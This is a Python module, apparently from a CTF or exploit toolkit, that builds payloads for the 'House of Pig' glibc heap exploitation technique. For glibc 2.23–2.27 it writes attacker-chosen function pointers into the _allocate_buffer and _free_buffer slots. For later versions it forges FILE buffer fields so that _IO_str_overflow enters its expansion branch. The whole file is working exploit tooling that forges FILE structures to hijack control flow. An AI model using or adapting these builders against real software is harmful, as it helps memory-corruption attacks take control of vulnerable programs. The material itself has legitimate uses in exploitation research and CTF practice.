"""House of Pig payload builders.

The helpers in this module only build the FILE fields consumed by
``_IO_str_overflow``.  Challenge-specific heap grooming, malloc return control,
and the final callback/ROP chain stay in the exploit script.
"""

from __future__ import annotations

from dataclasses import dataclass


FILE_READ_BASE = 0x08
FILE_READ_PTR = 0x10
FILE_READ_END = 0x18
FILE_WRITE_BASE = 0x20
FILE_WRITE_PTR = 0x28
FILE_WRITE_END = 0x30
FILE_BUF_BASE = 0x38
FILE_BUF_END = 0x40
LEGACY_ALLOCATE_SLOT = 0xE0
LEGACY_FREE_SLOT = 0xE8
UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


@dataclass(frozen=True)
class PigPlan:
    old_buffer_addr: int
    old_length: int
    new_size: int
    allocate_slot_addr: int | None
    free_slot_addr: int | None


@dataclass(frozen=True)
class PigPayload:
    plan: PigPlan
    writes: tuple[MemoryWrite, ...]


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit in uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def _version_minor(version: str) -> int:
    prefix = "2."
    if not version.startswith(prefix):
        raise ValueError("unsupported glibc version")
    try:
        minor = int(version[len(prefix) :])
    except ValueError as exc:
        raise ValueError("unsupported glibc version") from exc
    if minor < 23 or minor > 43:
        raise ValueError("unsupported glibc version")
    return minor


def _new_size(old_length: int) -> int:
    if old_length <= 0:
        raise ValueError("old_length must be positive")
    value = 2 * old_length + 100
    if value >= UINT64_LIMIT:
        raise ValueError("new_size overflows uint64")
    return value


def build_house_of_pig(
    *,
    version: str,
    old_buffer_addr: int,
    old_length: int,
    stream_addr: int | None = None,
) -> PigPlan:
    """Return the version-specific Pig expansion plan."""

    minor = _version_minor(version)
    _check_uint64("old_buffer_addr", old_buffer_addr)
    size = _new_size(old_length)

    if minor <= 27:
        if stream_addr is None:
            raise ValueError("glibc 2.23 through 2.27 require stream_addr")
        _check_uint64("stream_addr", stream_addr)
        allocate_slot_addr = stream_addr + LEGACY_ALLOCATE_SLOT
        free_slot_addr = stream_addr + LEGACY_FREE_SLOT
        _check_uint64("allocate_slot_addr", allocate_slot_addr)
        _check_uint64("free_slot_addr", free_slot_addr)
    else:
        allocate_slot_addr = None
        free_slot_addr = None

    return PigPlan(
        old_buffer_addr=old_buffer_addr,
        old_length=old_length,
        new_size=size,
        allocate_slot_addr=allocate_slot_addr,
        free_slot_addr=free_slot_addr,
    )


def build_house_of_pig_payload(
    *,
    version: str,
    stream_addr: int,
    old_buffer_addr: int,
    old_length: int,
    allocate_callback_addr: int | None = None,
    free_callback_addr: int | None = None,
) -> PigPayload:
    """Build concrete writes for the ``_IO_str_overflow`` sink.

    glibc 2.23-2.27:
        writes the legacy ``_allocate_buffer`` and ``_free_buffer`` slots.

    glibc 2.28-2.43:
        writes the FILE buffer fields that force the next byte write to enter
        the expansion branch.  The exploit must separately make the internal
        ``malloc(new_size)`` return the desired destination.
    """

    minor = _version_minor(version)
    _check_uint64("stream_addr", stream_addr)
    _check_uint64("old_buffer_addr", old_buffer_addr)
    plan = build_house_of_pig(
        version=version,
        old_buffer_addr=old_buffer_addr,
        old_length=old_length,
        stream_addr=stream_addr if minor <= 27 else None,
    )

    old_end = old_buffer_addr + old_length
    _check_uint64("old_end", old_end)

    if minor <= 27:
        if allocate_callback_addr is None or free_callback_addr is None:
            raise ValueError("legacy Pig requires allocate_callback_addr and free_callback_addr")
        _check_uint64("allocate_callback_addr", allocate_callback_addr)
        _check_uint64("free_callback_addr", free_callback_addr)
        writes = (
            MemoryWrite(
                plan.allocate_slot_addr,
                _pack64(allocate_callback_addr),
                "_IO_strfile._allocate_buffer",
            ),
            MemoryWrite(
                plan.free_slot_addr,
                _pack64(free_callback_addr),
                "_IO_strfile._free_buffer",
            ),
        )
        return PigPayload(plan=plan, writes=writes)

    image = bytearray(FILE_BUF_END + 8)
    fields = (
        (FILE_READ_BASE, old_buffer_addr),
        (FILE_READ_PTR, old_buffer_addr),
        (FILE_READ_END, old_buffer_addr),
        (FILE_WRITE_BASE, old_buffer_addr),
        (FILE_WRITE_PTR, old_end),
        (FILE_WRITE_END, old_end),
        (FILE_BUF_BASE, old_buffer_addr),
        (FILE_BUF_END, old_end),
    )
    for offset, value in fields:
        image[offset : offset + 8] = _pack64(value)

    writes = (
        MemoryWrite(
            stream_addr,
            bytes(image),
            "_IO_str_overflow expansion fields",
        ),
    )
    return PigPayload(plan=plan, writes=writes)
